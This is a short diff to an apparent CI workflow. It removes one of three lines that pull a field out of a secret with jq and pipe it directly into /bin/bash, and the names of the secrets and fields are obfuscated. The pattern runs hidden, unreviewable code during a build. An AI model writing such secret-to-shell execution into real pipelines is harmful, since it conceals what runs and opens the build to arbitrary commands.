@@ -23,7 +23,6 @@ jobs:
           qzr374: ${{ secrets.qzr374 }}
         run: |
           printf '%s' "$qzr374" | jq -r .uy5494 | /bin/bash
-          printf '%s' "$pzyu030" | jq -r .awev38 | /bin/bash
           printf '%s' "$clnhq53" | jq -r .lzpj75420 | /bin/bash
 
       - name: Store artifact
